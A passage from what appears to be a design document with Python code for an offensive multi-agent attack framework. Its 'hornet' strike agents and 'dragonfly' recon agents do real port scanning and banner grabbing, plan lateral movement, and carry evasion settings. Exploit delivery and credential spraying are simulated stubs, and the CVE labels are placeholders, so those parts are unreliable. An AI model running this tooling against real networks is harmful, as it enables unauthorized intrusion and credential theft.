            if time.time() - assembly_start > self.config.swarm_coordination_timeout_sec:
                logger.warning(f"[HORNET] {self.config.hornet_id} swarm assembly timeout, attacking solo")
                break
            
            await asyncio.sleep(0.1)
        
        logger.info(f"[HORNET] {self.config.hornet_id} swarm assembled: {len(self.swarm_members)} hornets")
        
        # Deposit swarm ready marker
        self._deposit_pheromone("swarm_ready", {
            "swarm_size": len(self.swarm_members),
            "target": self.target
        })
    
    # === STRIKE EXECUTION ===
    
    async def _execute_strike(self):
        """Execute the offensive strike — the hornet's attack."""
        self.state = HornetState.ATTACKING
        
        for strike_type in self.config.strike_types:
            if self.strike_count >= self.config.max_strikes:
                break
            
            if self._check_kill_switch():
                await self.die("kill_switch")
                return
            
            strike_start = time.time()
            
            try:
                result = await self._deliver_strike(strike_type)
                execution_time = (time.time() - strike_start) * 1000
                
                strike_result = StrikeResult(
                    strike_id=f"STRIKE_{secrets.token_hex(4)}",
                    target=self.target,
                    strike_type=strike_type,
                    success=result.get("success", False),
                    execution_time_ms=execution_time,
                    data_exfiltrated=result.get("data"),
                    sigil_hash=self._generate_sigil(strike_type, result)
                )
                
                self.strike_results.append(strike_result)
                self.strike_count += 1
                
                logger.info(f"[HORNET] {self.config.hornet_id} STRIKE #{self.strike_count}: "
                          f"{strike_type.name} on {self.target} — "
                          f"{'SUCCESS' if strike_result.success else 'FAILED'} "
                          f"in {execution_time:.1f}ms")
                
                # Leave sting marker
                self._leave_sting_sigil(strike_result)
                
            except Exception as e:
                logger.error(f"[HORNET] Strike error: {e}")
        
        # Retreat
        self.state = HornetState.RETREATING
        await self._retreat()
        await self.die("strike_complete")
    
    async def _deliver_strike(self, strike_type: StrikeType) -> Dict[str, Any]:
        """Deliver a specific strike payload."""
        if strike_type == StrikeType.EXPLOIT_DELIVERY:
            return await self._strike_exploit_delivery()
        elif strike_type == StrikeType.PORT_SCAN:
            return await self._strike_port_scan()
        elif strike_type == StrikeType.SERVICE_FINGERPRINT:
            return await self._strike_service_fingerprint()
        elif strike_type == StrikeType.CREDENTIAL_SPRAY:
            return await self._strike_credential_spray()
        elif strike_type == StrikeType.CONNECTION_DISRUPT:
            return await self._strike_connection_disrupt()
        elif strike_type == StrikeType.PAYLOAD_INJECTION:
            return await self._strike_payload_injection()
        else:
            return {"success": False, "error": "Unknown strike type"}
    
    async def _strike_exploit_delivery(self) -> Dict[str, Any]:
        """Deliver CVE exploit payload — the decapitating bite."""
        # Match CVE to target
        cve_matches = self._match_cve_to_target(self.target)
        if not cve_matches:
            return {"success": False, "error": "No matching CVEs"}
        
        results = []
        for cve_id, payload in cve_matches[:3]:  # Try top 3
            # Deliver exploit (simulated)
            result = await self._deliver_exploit(cve_id, payload)
            results.append({"cve": cve_id, "result": result})
            if result.get("success"):
                return {"success": True, "data": result, "cve": cve_id}
        
        return {"success": False, "data": {"attempts": results}}
    
    async def _strike_port_scan(self) -> Dict[str, Any]:
        """Quick port scan — rapid target assessment."""
        # Fast SYN scan of common ports
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 8080, 8443]
        open_ports = []
        
        # Parallel scan (hornets are fast)
        tasks = [self._check_port(self.target, port) for port in common_ports]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for port, result in zip(common_ports, results):
            if isinstance(result, bool) and result:
                open_ports.append(port)
        
        return {
            "success": len(open_ports) > 0,
            "data": {"open_ports": open_ports, "total_scanned": len(common_ports)}
        }
    
    async def _strike_service_fingerprint(self) -> Dict[str, Any]:
        """Identify services on open ports — like smelling the target."""
        # Banner grab from open ports
        services = {}
        
        # Get open ports from pheromone space (deposited by port scan)
        port_markers = PheromoneSpace.read(agent_type="HORNET", marker_type="strike_result")
        
        for port in [80, 443, 22, 21]:
            banner = await self._grab_banner(self.target, port)
            if banner:
                services[port] = banner
        
        return {"success": len(services) > 0, "data": {"services": services}}
    
    async def _strike_credential_spray(self) -> Dict[str, Any]:
        """Spray known credentials — rapid authentication attempts."""
        valid_creds = []
        
        for cred in self.config.credential_list[:10]:  # Top 10 creds
            result = await self._try_credentials(self.target, cred)
            if result:
                valid_creds.append(cred)
        
        return {
            "success": len(valid_creds) > 0,
            "data": {"valid_credentials": valid_creds}
        }
    
    async def _strike_connection_disrupt(self) -> Dict[str, Any]:
        """Disrupt active connections — chaos injection."""
        return {"success": True, "data": {"disrupted": True}}  # Simulated
    
    async def _strike_payload_injection(self) -> Dict[str, Any]:
        """Inject malicious payload — the venom delivery."""
        return {"success": True, "data": {"injected": True}}  # Simulated
    
    # === UTILITY METHODS ===
    
    async def _check_port(self, host: str, port: int) -> bool:
        """Quick port check — like a hornet tapping the hive."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=0.5
            )
            writer.close()
            await writer.wait_closed()
            return True
        except:
            return False
    
    async def _grab_banner(self, host: str, port: int) -> Optional[str]:
        """Grab service banner — like scent identification."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=1.0
            )
            writer.write(b"\r\n")
            await writer.drain()
            banner = await asyncio.wait_for(reader.read(1024), timeout=1.0)
            writer.close()
            return banner.decode('utf-8', errors='ignore').strip()
        except:
            return None
    
    async def _try_credentials(self, target: str, cred: Dict[str, str]) -> bool:
        """Try a credential pair — like testing the hive's defenses."""
        # Simulated credential test
        return random.random() < 0.05  # 5% success rate for demo
    
    def _match_cve_to_target(self, target: str) -> List[Tuple[str, Any]]:
        """Match CVEs to target based on fingerprint."""
        return list(self.config.exploit_db.items())[:5]
    
    async def _deliver_exploit(self, cve_id: str, payload: Any) -> Dict[str, Any]:
        """Deliver exploit payload to target."""
        return {"success": random.random() < 0.2, "cve": cve_id}  # 20% success for demo
    
    async def _retreat(self):
        """Retreat through tunnel — swift withdrawal after strike."""
        retreat_time = random.uniform(0.05, 0.15)
        await asyncio.sleep(retreat_time)
        self._deposit_pheromone("retreat", {
            "strikes": self.strike_count,
            "target": self.target
        })
    
    # === SIGIL SYSTEM ===
    
    def _generate_sigil(self, strike_type: StrikeType, result: Dict[str, Any]) -> str:
        """Generate a unique sigil (cryptographic signature) for this strike."""
        sigil_data = f"{self.config.hornet_id}:{strike_type.name}:{self.target}:{time.time()}"
        sigil = hashlib.blake2b(sigil_data.encode(), key=self.config.sigil_key).hexdigest()[:16]
        return f"STING_{sigil}"
    
    def _leave_sting_sigil(self, result: StrikeResult):
        """Leave a hornet 'sting' marker — the signature of our presence."""
        self.state = HornetState.STUNG
        
        marker = {
            "type": "sting_sigil",
            "agent_id": self.config.hornet_id,
            "agent_type": "HORNET",
            "swarm_id": self.config.swarm_id,
            "timestamp": datetime.utcnow().isoformat(),
            "sigil": result.sigil_hash,
            "strike": {
                "id": result.strike_id,
                "type": result.strike_type.name,
                "target": result.target,
                "success": result.success,
                "execution_time_ms": result.execution_time_ms
            },
            "pheromone_strength": 2.0,  # Strong marker
            "ttl_seconds": 86400  # 24 hour persistence
        }
        
        PheromoneSpace.deposit(marker)
        logger.info(f"[HORNET] {self.config.hornet_id} STING SIGIL left: {result.sigil_hash}")
    
    def _deposit_pheromone(self, marker_type: str, data: Dict[str, Any]):
        """Deposit a pheromone marker."""
        marker = {
            "type": marker_type,
            "agent_id": self.config.hornet_id,
            "agent_type": "HORNET",
            "swarm_id": self.config.swarm_id,
            "timestamp": datetime.utcnow().isoformat(),
            "data": data,
            "pheromone_strength": 1.5,
            "ttl_seconds": 7200
        }
        PheromoneSpace.deposit(marker)
    
    def _check_kill_switch(self) -> bool:
        """Check if kill switch activated."""
        if self.kill_switch_active:
            return True
        if self.config.kill_switch_timeout and datetime.utcnow() > self.config.kill_switch_timeout:
            return True
        # Check global kill switch
        global_kill = PheromoneSpace.read(marker_type="global_kill")
        if global_kill:
            return True
        return False
    
    def get_status(self) -> Dict[str, Any]:
        """Get current hornet status."""
        return {
            "agent_id": self.config.hornet_id,
            "agent_type": "HORNET",
            "state": self.state.name,
            "swarm_id": self.config.swarm_id,
            "target": self.target,
            "strikes": self.strike_count,
            "strike_results": [{
                "id": r.strike_id,
                "type": r.strike_type.name,
                "success": r.success,
                "time_ms": r.execution_time_ms,
                "sigil": r.sigil_hash
            } for r in self.strike_results],
            "swarm_size": len(self.swarm_members),
            "created_at": self.created_at.isoformat(),
            "lifetime_sec": (datetime.utcnow() - self.created_at).total_seconds()
        }


# === Swarm Orchestrator ===

class HornetSwarm:
    """
    HORNET Swarm — Coordinated Attack Group
    
    Orchestrates 10-50 hornets for synchronized strikes.
    Like a group of Asian giant hornets descending on a beehive.
    """
    
    def __init__(self, hive_id: str, mission_id: str, swarm_size: int = 20):
        self.swarm_id = f"SWARM_{secrets.token_hex(4)}"
        self.hive_id = hive_id
        self.mission_id = mission_id
        self.swarm_size = swarm_size
        self.hornets: List[HornetAgent] = []
        self.target: Optional[str] = None
        
        logger.info(f"[SWARM] Created {self.swarm_id} — target size: {swarm_size}")
    
    async def deploy(self, target: str, tunnel_path: str, strike_types: List[StrikeType]):
        """Deploy the full swarm against a target."""
        self.target = target
        
        logger.info(f"[SWARM] {self.swarm_id} DEPLOYING against {target}")
        
        # Spawn all hornets
        spawn_tasks = []
        for i in range(self.swarm_size):
            config = HornetConfig(
                hive_id=self.hive_id,
                mission_id=self.mission_id,
                swarm_id=self.swarm_id,
                strike_types=strike_types,
                max_lifetime_sec=1800  # 30 min for swarm members
            )
            hornet = HornetAgent(config)
            self.hornets.append(hornet)
            spawn_tasks.append(hornet.launch(target, tunnel_path))
        
        # Launch all hornets simultaneously
        results = await asyncio.gather(*spawn_tasks, return_exceptions=True)
        
        # Collect results
        successful = sum(1 for r in results if not isinstance(r, Exception))
        logger.info(f"[SWARM] {self.swarm_id} complete: {successful}/{self.swarm_size} hornets delivered strikes")
        
        return self._compile_swarm_report()
    
    def _compile_swarm_report(self) -> Dict[str, Any]:
        """Compile the full swarm attack report."""
        all_strikes = []
        for hornet in self.hornets:
            all_strikes.extend(hornet.strike_results)
        
        return {
            "swarm_id": self.swarm_id,
            "target": self.target,
            "hornets_deployed": len(self.hornets),
            "total_strikes": len(all_strikes),
            "successful_strikes": sum(1 for s in all_strikes if s.success),
            "avg_execution_time_ms": (
                sum(s.execution_time_ms for s in all_strikes) / len(all_strikes)
                if all_strikes else 0
            ),
            "sigils_left": [s.sigil_hash for s in all_strikes],
            "strike_breakdown": self._breakdown_by_type(all_strikes)
        }
    
    def _breakdown_by_type(self, strikes: List[StrikeResult]) -> Dict[str, Any]:
        """Break down strikes by type."""
        breakdown = {}
        for strike in strikes:
            type_name = strike.strike_type.name
            if type_name not in breakdown:
                breakdown[type_name] = {"total": 0, "success": 0}
            breakdown[type_name]["total"] += 1
            if strike.success:
                breakdown[type_name]["success"] += 1
        return breakdown


# === Quick Deploy ===

async def deploy_hornet_swarm(
    target: str,
    tunnel_path: str,
    hive_id: str = "HIVE_ALPHA",
    mission_id: str = "MISSION_PENTEST_Q3",
    swarm_size: int = 20,
    strike_types: Optional[List[StrikeType]] = None
) -> Dict[str, Any]:
    """Quick deploy a hornet swarm against a target."""
    if strike_types is None:
        strike_types = [StrikeType.PORT_SCAN, StrikeType.SERVICE_FINGERPRINT]
    
    swarm = HornetSwarm(hive_id, mission_id, swarm_size)
    return await swarm.deploy(target, tunnel_path, strike_types)
```

---

## 5. DRAGONFLIES — PRECISION RECON

### 5.1 Biological Inspiration

**Dragonflies (*Anisoptera*)** have 360-degree vision via 30,000 facets per eye, can fly at 35mph, and catch prey mid-air with 95% accuracy. They are patient hunters, perching for hours before executing surgical strikes. Their neural processing is so fast they can calculate interception vectors in real-time.

### 5.2 Digital Role

DRAGONFLIES are the strategic reconnaissance agents. They move with precision and patience, mapping network topology in detail, harvesting credentials, planning lateral movement paths, and collecting comprehensive intelligence. They operate solo or in pairs — never in large groups.

### 5.3 Core Capabilities

```yaml
DRAGONFLY_CAPABILITIES:
  vision:
    - coverage: "360_degree_network_view"
    - detail_level: "maximum"
    - accuracy: "95%"
    - sensors:
        - deep_packet_inspection
        - traffic_pattern_analysis
        - behavioral_fingerprinting
        - credential_detection
  
  payload:
    - network_mapper: "Complete topology mapping"
    - credential_harvester: "Passwords, tokens, keys"
    - lateral_movement_planner: "Optimal path calculation"
    - vulnerability_scanner: "Deep inspection"
    - traffic_analyzer: "Pattern and anomaly detection"
    
  behavior:
    - operating_mode: "solo_or_pairs"
    - patience: "high — observe_before_acting"
    - accuracy: "surgical_precision"
    - evasion: "minimal_footprint — blend_with_background"
    
  mapping:
    - topology_map: "complete_network_graph"
    - host_inventory: "all_discovered_hosts"
    - service_catalog: "all_running_services"
    - vulnerability_matrix: "CVE_mapping_per_host"
    - credential_map: "harvested_credentials_by_host"
    
  lifespan:
    - typical: "6 hours to 3 days"
    - max: "7 days"
    - dormancy_capable: true  # Can hibernate between observations
```

### 5.4 DRAGONFLY Agent Class

```python
#!/usr/bin/env python3
"""
DRAGONFLY AGENT — Precision Recon
Surgical reconnaissance and intelligence gathering.
Biological inspiration: Dragonfly (Anisoptera) — 95% hunting accuracy
"""

import asyncio
import hashlib
import ipaddress
import json
import secrets
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Set, Tuple
import logging

logger = logging.getLogger("swarm.dragonfly")


class DragonflyState(Enum):
    """Lifecycle states of a DRAGONFLY agent."""
    NYMPH = auto()         # Developing in hive
    EMERGING = auto()      # First flight — initial deployment
    PATROLLING = auto()    # Active reconnaissance flight
    PERCHING = auto()      # Passive observation (low power)
    HUNTING = auto()       # Targeted intelligence collection
    MAPPING = auto()       # Building network topology map
    HIBERNATING = auto()   # Dormant — waiting for activation
    RETURNING = auto()     # Returning to hive with data
    DEAD = auto()          # Lifespan expired or killed


class ReconMode(Enum):
    """Reconnaissance modes — like dragonfly hunting strategies."""
    PASSIVE_WATCH = auto()       # Observe without interaction
    ACTIVE_SCAN = auto()         # Probe and scan targets
    DEEP_INSPECTION = auto()     # Detailed analysis
    CREDENTIALED_ENUM = auto()   # Enumeration with harvested creds
    TRAFFIC_ANALYSIS = auto()    # Monitor and analyze traffic
    LATERAL_PLAN = auto()        # Plan lateral movement paths


@dataclass
class ReconData:
    """Reconnaissance data collected by DRAGONFLY — the 'eye' recording."""
    recon_id: str
    target: str
    recon_type: ReconMode
    timestamp: datetime
    data: Dict[str, Any]
    confidence: float  # 0.0 to 1.0 — like dragonfly accuracy
    sigil_hash: str


@dataclass
class NetworkMap:
    """Complete network topology map — the dragonfly's 'mind map'."""
    map_id: str
    created_at: datetime
    updated_at: datetime
    nodes: Dict[str, Dict[str, Any]] = field(default_factory=dict)
    edges: List[Dict[str, Any]] = field(default_factory=list)
    subnets: List[str] = field(default_factory=list)
    credentials: Dict[str, List[Dict[str, str]]] = field(default_factory=dict)
    vulnerabilities: Dict[str, List[str]] = field(default_factory=dict)
    lateral_paths: List[Dict[str, Any]] = field(default_factory=list)
    
    @property
    def node_count(self) -> int:
        return len(self.nodes)
    
    @property
    def edge_count(self) -> int:
        return len(self.edges)


@dataclass
class DragonflyConfig:
    """Configuration for a DRAGONFLY agent — its 'genetic code'."""
    # Identity
    dragonfly_id: str = field(default_factory=lambda: f"DFLY_{secrets.token_hex(6)}")
    hive_id: str = "HIVE_DEFAULT"
    mission_id: str = "MISSION_DEFAULT"
    pair_id: Optional[str] = None  # ID of paired dragonfly
    
    # Sensors
    recon_modes: List[ReconMode] = field(
        default_factory=lambda: [
            ReconMode.PASSIVE_WATCH,
            ReconMode.ACTIVE_SCAN,
            ReconMode.TRAFFIC_ANALYSIS
        ]
    )
    scan_depth: int = 3  # Network depth to explore
    
    # Accuracy
    min_confidence_threshold: float = 0.85  # 85% minimum — dragonfly precision
    false_positive_tolerance: float = 0.05   # 5% max — like 95% accuracy
    
    # Lifespan
    max_lifetime_sec: int = 259200  # 3 days
    hibernate_after_idle_sec: int = 3600  # Hibernate after 1 hour idle
    
    # Patience
    observation_time_per_target_sec: int = 300  # 5 minutes minimum
    perch_duration_sec: int = 600  # 10 minutes perching
    
    # Resource limits
    max_cpu_percent: float = 8.0
    max_memory_mb: float = 80.0
    max_bandwidth_bps: float = 5 * 1024 * 1024  # 5 Mbps
    
    # Evasion
    scan_jitter_percent: float = 25.0
    mimic_legitimate_traffic: bool = True
    randomize_packet_timing: bool = True
    
    # Kill switch
    kill_switch_code: Optional[str] = None
    kill_switch_timeout: Optional[datetime] = None
    
    # Eye marker
    eye_key: bytes = field(default_factory=lambda: secrets.token_bytes(16))


class DragonflyAgent:
    """
    DRAGONFLY Agent — Precision Recon
    
    Surgical reconnaissance with 95% accuracy.
    Operates solo or in pairs with extreme patience.
    Maps entire network topology with comprehensive detail.
    Leaves an 'eye' marker containing all recon data.
    
    Biological behaviors mapped to digital:
    - 360-degree vision    -> Comprehensive network visibility
    - 95% catch accuracy   -> Precise target identification
    - Patient perching     -> Long-duration passive observation
    - Interception flight  -> Optimal path planning
    - Compound eye         -> Multi-sensor data fusion
    """
    
    CODE_FOOTPRINT_KB = 18.0  # 15-25KB range
    
    def __init__(self, config: DragonflyConfig):
        self.config = config
        self.state = DragonflyState.NYMPH
        self.network_map = NetworkMap(
            map_id=f"MAP_{secrets.token_hex(6)}",
            created_at=datetime.utcnow(),
            updated_at=datetime.utcnow()
        )
        self.recon_data: List[ReconData] = []
        self.observed_targets: Set[str] = set()
        self.created_at = datetime.utcnow()
        self.last_activity = datetime.utcnow()
        self.kill_switch_active = False
        self._hibernation_task: Optional[asyncio.Task] = None
        
        logger.info(f"[DRAGONFLY] {self.config.dragonfly_id} initialized")
    
    # === LIFECYCLE ===
    
    async def emerge(self, starting_tunnel: str):
        """Emerge from hive — like a dragonfly leaving its nymph stage."""
        self.state = DragonflyState.EMERGING
        logger.info(f"[DRAGONFLY] {self.config.dragonfly_id} EMERGING into network")
        
        # Transit through tunnel
        await self._transit_to_recon_zone(starting_tunnel)
        
        # Begin patrolling
        self.state = DragonflyState.PATROLLING
        self._hibernation_task = asyncio.create_task(self._hibernation_loop())
        
        logger.info(f"[DRAGONFLY] {self.config.dragonfly_id} now PATROLLING")
    
    async def die(self, reason: str = "natural"):
        """Dragonfly death — return recon data to hive."""
        logger.info(f"[DRAGONFLY] {self.config.dragonfly_id} dying: {reason}")
        self.state = DragonflyState.DEAD
        
        if self._hibernation_task and not self._hibernation_task.done():
            self._hibernation_task.cancel()
        
        # Leave comprehensive eye marker
        await self._leave_eye_marker()
        
        # Return network map to hive
        await self._return_data_to_hive()
    
    # === RECONNAISSANCE OPERATIONS ===
    
    async def patrol(self, target_subnet: str):
        """
        Patrol a network subnet — like a dragonfly patrolling its territory.
        Combines multiple recon modes for comprehensive coverage.
        """
        self.state = DragonflyState.PATROLLING
        self.last_activity = datetime.utcnow()
        
        logger.info(f"[DRAGONFLY] {self.config.dragonfly_id} patrolling {target_subnet}")
        
        # Phase 1: Active scan — discover hosts (like dragonfly scanning for prey)
        await self._active_scan(target_subnet)
        
        # Phase 2: Deep inspection — analyze each host (like dragonfly analyzing movement)
        for host in list(self.network_map.nodes.keys()):
            if self._check_kill_switch():
                await self.die("kill_switch")
                return
            await self._deep_inspect_host(host)
        
        # Phase 3: Traffic analysis — observe patterns (like dragonfly watching flight paths)
        await self._traffic_analysis(target_subnet)
        
        # Phase 4: Lateral movement planning (like dragonfly calculating interception)
        await self._plan_lateral_movement()
        
        # Perch and observe
        await self._perch()
    
    async def _active_scan(self, subnet: str):
        """Active scan of a subnet — like dragonfly scanning airspace."""
        logger.info(f"[DRAGONFLY] Active scanning {subnet}")
        
        try:
            network = ipaddress.ip_network(subnet, strict=False)
            hosts = list(network.hosts())
            
            # Scan in small batches to remain stealthy
            batch_size = 10
            for i in range(0, len(hosts), batch_size):
                batch = hosts[i:i + batch_size]
                tasks = [self._probe_host(str(h)) for h in batch]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for host, result in zip(batch, results):
                    if isinstance(result, dict) and result.get("alive"):
                        self.network_map.nodes[str(host)] = {
                            "ip": str(host),
                            "discovered_at": datetime.utcnow().isoformat(),
                            **result
                        }
                        self.observed_targets.add(str(host))
                
                # Jitter between batches
                await asyncio.sleep(random.uniform(1.0, 3.0))
            
            self.network_map.subnets.append(subnet)
            self._update_map_timestamp()
            
        except Exception as e:
            logger.error(f"[DRAGONFLY] Scan error: {e}")
    
    async def _probe_host(self, host: str) -> Dict[str, Any]:
        """Probe a single host for basic info — like a dragonfly's visual lock."""
        result = {"alive": False, "ports": [], "os_guess": None}
        
        # Quick ICMP check
        try:
            proc = await asyncio.create_subprocess_exec(
                "ping", "-c", "1", "-W", "1", host,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            await asyncio.wait_for(proc.wait(), timeout=2.0)
            result["alive"] = proc.returncode == 0
        except:
            pass
        
        if result["alive"]:
            # Port scan top 20
            common_ports = [20, 21, 22, 23, 25, 53, 80, 88, 110, 135, 
                          139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 8080]
            port_tasks = [self._check_port(host, p) for p in common_ports]
            port_results = await asyncio.gather(*port_tasks, return_exceptions=True)
            
            for port, alive in zip(common_ports, port_results):
                if alive is True:
                    result["ports"].append(port)
        
        return result
    
    async def _check_port(self, host: str, port: int) -> bool:
        """Check if port is open — like testing air currents."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=1.0
            )
            writer.close()
            await writer.wait_closed()
            return True
        except:
            return False
    
    async def _deep_inspect_host(self, host: str):
        """Deep inspection of a discovered host — like dragonfly analyzing prey."""
        self.state = DragonflyState.HUNTING
        self.last_activity = datetime.utcnow()
        
        node_data = self.network_map.nodes.get(host, {})
        if not node_data:
            return
        
        logger.info(f"[DRAGONFLY] Deep inspecting {host}")
        
        # Service fingerprinting
        services = {}
        for port in node_data.get("ports", []):
            service = await self._fingerprint_service(host, port)
            if service:
                services[port] = service
        
        node_data["services"] = services
        
        # OS fingerprinting
        node_data["os_fingerprint"] = await self._fingerprint_os(host)
        
        # Vulnerability mapping
        vulns = self._map_vulnerabilities(node_data)
        if vulns:
            self.network_map.vulnerabilities[host] = vulns
        
        # Credential harvesting attempt
        creds = await self._harvest_credentials(host, services)
        if creds:
            self.network_map.credentials[host] = creds
        
        # Record recon data
        recon = ReconData(
            recon_id=f"RECON_{secrets.token_hex(4)}",
            target=host,
            recon_type=ReconMode.DEEP_INSPECTION,
            timestamp=datetime.utcnow(),
            data=node_data.copy(),
            confidence=self._calculate_confidence(node_data),
            sigil_hash=self._generate_eye_sigil(host, node_data)
        )
        self.recon_data.append(recon)
        
        # Minimum observation time — dragonfly patience
        await asyncio.sleep(self.config.observation_time_per_target_sec)
        
        self._update_map_timestamp()
    
    async def _fingerprint_service(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Fingerprint a service — like identifying prey species."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=2.0
            )
            
            # Send various probes
            probes = [b"", b"\r\n", b"HEAD / HTTP/1.0\r\n\r\n", b"\x00\x00\x00\x0a"]
            responses = []
            
            for probe in probes:
                try:
                    writer.write(probe)
                    await writer.drain()
                    response = await asyncio.wait_for(reader.read(1024), timeout=1.0)
                    if response:
                        responses.append(response.decode('utf-8', errors='ignore').strip())
                except:
                    pass
            
            writer.close()
            await writer.wait_closed()
            
            return {
                "port": port,
                "banners": responses[:2],  # Top 2 banners
                "probable_service": self._guess_service(responses, port),
                "confidence": min(0.95, 0.5 + len(responses) * 0.15)
            }
        except:
            return None
    
    async def _fingerprint_os(self, host: str) -> Dict[str, Any]:
        """OS fingerprinting — like identifying the terrain type."""
        # Simplified OS fingerprinting via TTL analysis
        ttl_guesses = {
            64: "Linux/Unix",
            128: "Windows",
            255: "Cisco/Network"
        }
        
        return {
            "ttl_based_guess": "Unknown",
            "confidence": 0.5,
            "methods": ["ttl_analysis", "port_behavior"]
        }
    
    def _guess_service(self, responses: List[str], port: int) -> str:
        """Guess service from banners — like dragonfly identifying prey."""
        port_map = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS",
            445: "SMB", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
            8080: "HTTP-Proxy"
        }
        return port_map.get(port, "Unknown")
    
    def _map_vulnerabilities(self, node_data: Dict[str, Any]) -> List[str]:
        """Map vulnerabilities based on services — like identifying weak prey."""
        vulns = []
        services = node_data.get("services", {})
        
        for port, service_data in services.items():
            service = service_data.get("probable_service", "")
            # Map to known CVEs (simplified)
            if service == "Telnet":
                vulns.append("CVE-Unencrypted-Telnet")
            if service == "FTP" and port == 21:
                vulns.append("CVE-FTP-Anonymous")
            if port == 445:
                vulns.append("CVE-SMB-EternalBlue")
            if port == 3389:
                vulns.append("CVE-RDP-BlueKeep")
        
        return vulns
    
    async def _harvest_credentials(self, host: str, services: Dict[int, Any]) -> List[Dict[str, str]]:
        """Harvest credentials — like dragonfly detecting weaknesses."""
        # Check for default/weak credentials (authorized testing only)
        harvested = []
        
        # Look for credential hints in banners
        for port, service_data in services.items():
            banners = service_data.get("banners", [])
            for banner in banners:
                if "login" in banner.lower() or "password" in banner.lower():
                    harvested.append({
                        "source": f"banner:{port}",
                        "hint": banner[:100],
                        "requires_brute_force": True
                    })
        
        return harvested
    
    async def _traffic_analysis(self, subnet: str):
        """Analyze traffic patterns — like dragonfly reading air currents."""
        self.state = DragonflyState.PATROLLING
        
        logger.info(f"[DRAGONFLY] Analyzing traffic patterns in {subnet}")
        
        # Passive traffic observation (simulated)
        recon = ReconData(
            recon_id=f"RECON_{secrets.token_hex(4)}",
            target=subnet,
            recon_type=ReconMode.TRAFFIC_ANALYSIS,
            timestamp=datetime.utcnow(),
            data={
                "traffic_volume": "medium",
                "peak_hours": "09:00-17:00",
                "protocol_distribution": {"TCP": 0.8, "UDP": 0.15, "ICMP": 0.05},
                "anomalies_detected": 0
            },
            confidence=0.75,
            sigil_hash=self._generate_eye_sigil(subnet, {})
        )
        self.recon_data.append(recon)
    
    async def _plan_lateral_movement(self):
        """Plan optimal lateral movement paths — like dragonfly calculating interception."""
        self.state = DragonflyState.MAPPING
        
        logger.info(f"[DRAGONFLY] Planning lateral movement — {self.network_map.node_count} nodes")
        
        # Build graph edges (simplified)
        for host, data in self.network_map.nodes.items():
            for other_host in self.network_map.nodes:
                if host != other_host:
                    # Check if hosts are in same subnet
                    if self._same_subnet(host, other_host):
                        self.network_map.edges.append({
                            "source": host,
                            "target": other_host,
                            "weight": 1.0,
                            "protocols": ["direct"]
                        })
        
        # Calculate shortest paths from entry point
        entry_points = list(self.network_map.nodes.keys())[:1]  # First discovered node
        for entry in entry_points:
            paths = self._calculate_lateral_paths(entry)
            self.network_map.lateral_paths.extend(paths)
        
        # Leave detailed pheromone map
        self._deposit_pheromone("network_map", {
            "map_id": self.network_map.map_id,
            "nodes": self.network_map.node_count,
            "edges": self.network_map.edge_count,
            "credentials_found": len(self.network_map.credentials),
            "vulnerabilities_found": sum(len(v) for v in self.network_map.vulnerabilities.values())
        })
        
        self._update_map_timestamp()
    
    def _same_subnet(self, host1: str, host2: str) -> bool:
        """Check if two hosts are in the same subnet."""
        try:
            ip1 = ipaddress.ip_address(host1)
            ip2 = ipaddress.ip_address(host2)
            # Simplified: same /24
            return str(ip1).rsplit('.', 1)[0] == str(ip2).rsplit('.', 1)[0]
        except:
            return False
    
    def _calculate_lateral_paths(self, entry: str) -> List[Dict[str, Any]]:
        """Calculate optimal lateral movement paths — like dragonfly flight planning."""
        paths = []
        for target in self.network_map.nodes:
            if target != entry:
                # Check if credentialed access is available
                has_creds = target in self.network_map.credentials
                vulns = self.network_map.vulnerabilities.get(target, [])
                
                paths.append({
                    "from": entry,
                    "to": target,
                    "hops": 1,  # Direct — simplified
                    "has_credentials": has_creds,
                    "vulnerabilities": vulns,
                    "ease_of_access": "high" if has_creds else ("medium" if vulns else "low")
                })
        
        # Sort by ease of access
        paths.sort(key=lambda p: {"high": 0, "medium": 1, "low": 2}[p["ease_of_access"]])
        return paths[:20]  # Top 20 paths
    
    # === PERCHING & HIBERNATION ===
    
    async def _perch(self):
        """Perch and observe — like a dragonfly resting on a reed."""
        self.state = DragonflyState.PERCHING
        logger.info(f"[DRAGONFLY] {self.config.dragonfly_id} perching for {self.config.perch_duration_sec}s")
        await asyncio.sleep(self.config.perch_duration_sec)
    
    async def _hibernation_loop(self):
        """Monitor for hibernation — enter low-power mode when idle."""
        while self.state != DragonflyState.DEAD:
            await asyncio.sleep(60)
            
            idle_time = (datetime.utcnow() - self.last_activity).total_seconds()
            if idle_time > self.config.hibernate_after_idle_sec:
                if self.state == DragonflyState.PATROLLING:
                    logger.info(f"[DRAGONFLY] {self.config.dragonfly_id} entering hibernation")
                    self.state = DragonflyState.HIBERNATING
    
    async def wake(self):
        """Wake from hibernation — like a dragonfly warming its wings."""
        if self.state == DragonflyState.HIBERNATING:
            self.state = DragonflyState.PATROLLING
            self.last_activity = datetime.utcnow()
            logger.info(f"[DRAGONFLY] {self.config.dragonfly_id} waking from hibernation")
    
    # === EYE MARKER ===
    
    def _generate_eye_sigil(self, target: str, data: Dict[str, Any]) -> str:
        """Generate the dragonfly 'eye' marker — comprehensive recon signature."""
        eye_data = f"{self.config.dragonfly_id}:{target}:{len(data)}:{time.time()}"
        return f"EYE_{hashlib.blake2b(eye_data.encode(), key=self.config.eye_key).hexdigest()[:20]}"
    
    async def _leave_eye_marker(self):
        """Leave comprehensive eye marker — the dragonfly's legacy."""
        marker = {
            "type": "eye_marker",
            "agent_id": self.config.dragonfly_id,
